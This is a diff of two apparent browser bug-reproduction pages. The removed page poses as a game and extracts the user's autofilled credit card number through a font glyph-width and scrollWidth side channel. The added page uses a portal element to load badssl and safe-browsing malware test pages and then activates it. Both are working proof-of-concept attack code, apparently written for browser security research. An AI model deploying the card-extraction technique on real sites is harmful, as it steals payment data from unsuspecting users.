@@ -1,146 +1,16 @@
-
-<!doctype>
-<title>Totally trustworthy webpage</title>
-<script src="/static/opentype.js"></script>
-<style>
-textarea {
-    white-space: nowrap;
-    text-transform: lowercase;
-    width: 1px;
-    height: 1px;
-}
-#cover {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: orange;
-}
-</style>
-<div id="cover">
-    <h1>PRESS DOWN TO START PLAYING THE VERY FUN GAME</h1>
-    <div>It is totally not a sinister front for something evil.</div>
-</div>
-<form id="paymentForm">
-    <input name="ccname"
-           id="nameInput"
-           required
-           placeholder="Full Name"
-           autocomplete="cc-name"
-           autofocus
-           rows="1">
-    <label for="frmCCNum">Card Number</label>
-    <textarea id="textSizeTester"></textarea>
-</form>
+<html>
 <script>
-const textAreas = [];
-
-// Add 16 card number textareas, with maxlengths from 1-16, to the form, and
-// store references to all of them.
-for (let i = 1; i <= 16; i++) {
-    const textArea = document.createElement('textarea');
-    textArea.setAttribute('name', 'cardnumber');
-    textArea.setAttribute('autocomplete', 'cc-number');
-    textArea.setAttribute('maxlength', i);
-    textArea.setAttribute('rows', 1);
-    textAreas.push(textArea);
-    paymentForm.appendChild(textArea);
+var url = 'https://dh2048.badssl.com/';
+var portal = document.createElement('portal');
+function f() {
+	portal.src = url;
+	portal.style = "width:100%; height:100%";
+	setTimeout('alert();', 1000)
+	document.body.appendChild(portal);
+	portal.onload = function() { portal.src = 'https://testsafebrowsing.appspot.com/s/malware_in_iframe.html'; setTimeout('portal.activate(); portal.src="x";', 200);  }
 }
 
-// Utility function; nicked from https://stackoverflow.com/a/33292942/1709587
-function timeout(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-// Wait for the user to trigger the autocomplete preview text, then yank the
-// name input out of the form (hiding the autocomplete dialog) and call
-// determineCardNumber to determine the card number from the textArea widths.
-nameInput.addEventListener('keydown', async function (e) {
-    if (e.keyCode == 38 || e.keyCode == 40) {
-        while (textAreas[10].scrollWidth < 10) {
-            await timeout(1);
-        }
-        nameInput.remove();
-        alert(determineCardNumber(''));
-    }
-});
-
-function determineCardNumber(numberSoFar='') {
-    const nextDigit = numberSoFar.length,
-          nextScrollWidth = textAreas[nextDigit].scrollWidth;
-
-    for (let i = 0; i <= 9; i++) {
-        const candidateNumber = numberSoFar + String(i);
-        textSizeTester.value = candidateNumber;
-        if (textSizeTester.scrollWidth == nextScrollWidth) {
-            if (candidateNumber.length == 16) return candidateNumber;
-            return determineCardNumber(candidateNumber);
-        }
-    }
-    throw 'Failed!';
-}
-function htmlToElement(html) {
-    var template = document.createElement('template');
-    html = html.trim(); // Never return a text node of whitespace as the result
-    template.innerHTML = html;
-    return template.content.firstChild;
-}   
-
-var notdefGlyph = new opentype.Glyph({
-name: '.notdef',
-unicode: 0,
-advanceWidth: 1,
-    path: new opentype.Path(),
-});
-const glyphs = [notdefGlyph];
-for (let i=1; i<48; i++) {
-    const glyph = new opentype.Glyph({
-        name: 'bla',
-        unicode: i,
-        advanceWidth: 1,
-        path: new opentype.Path(),
-    });
-    glyphs.push(glyph);
-}
-for (let i=58; i<128; i++) {
-    const glyph = new opentype.Glyph({
-        name: 'bla',
-        unicode: i,
-        advanceWidth: 1,
-        path: new opentype.Path(),
-    });
-    glyphs.push(glyph);
-}
-for (let i=48; i<58; i++) {
-    const glyph = new opentype.Glyph({
-        name: 'bla',
-        unicode: i,
-        advanceWidth: Math.pow(i, 2),
-        path: new opentype.Path(),
-    });
-    glyphs.push(glyph);
-}
-var font = new opentype.Font({
-    familyName: 'bla',
-    styleName: 'bla',
-    unitsPerEm: 1000,
-    ascender: 800,
-    descender: -200,
-    glyphs: glyphs
-});
-
-var arrayBuffer = font.toArrayBuffer();
-var dataView = new DataView(arrayBuffer);
-var blob = new Blob([dataView], {type: 'font/opentype'});
-var fontUrl = window.URL.createObjectURL(blob);
-var styleElement = htmlToElement(`
-    <style>
-        @font-face {
-          font-family: 'system-ui';
-          src: url('${fontUrl}') format('truetype');
-        }
-    </style>
-`);
-document.head.appendChild(styleElement)
 </script>
+<body onload='f();'>
+</body>
+</html>
